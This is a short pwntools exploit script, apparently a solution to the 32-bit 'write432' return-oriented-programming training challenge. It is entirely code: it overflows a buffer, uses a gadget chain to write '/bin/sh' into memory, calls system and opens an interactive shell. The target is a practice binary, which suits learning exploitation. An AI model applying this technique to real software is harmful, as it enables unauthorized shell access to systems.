from pwn import *

r = process('./write432')
raw_input()

shl_code = '/bin/sh\x00'
shl_addr = 0x0804a028
call_sys = 0x08048430
pop_data = 0x080486da # pop edi ; pop ebp ; ret
mv_data  = 0x08048670 # mov dword ptr [edi], ebp ; ret

offset = 44


p = 'a' * offset
p += p32(pop_data)
p += p32(shl_addr)
p += shl_code[:4]
p += p32(mv_data)
p += p32(pop_data)
p += p32(shl_addr + 4)
p += shl_code[4:]
p += p32(mv_data)
p += p32(call_sys)
p += p32(0)
p += p32(shl_addr)

r.sendline(p)


r.interactive()
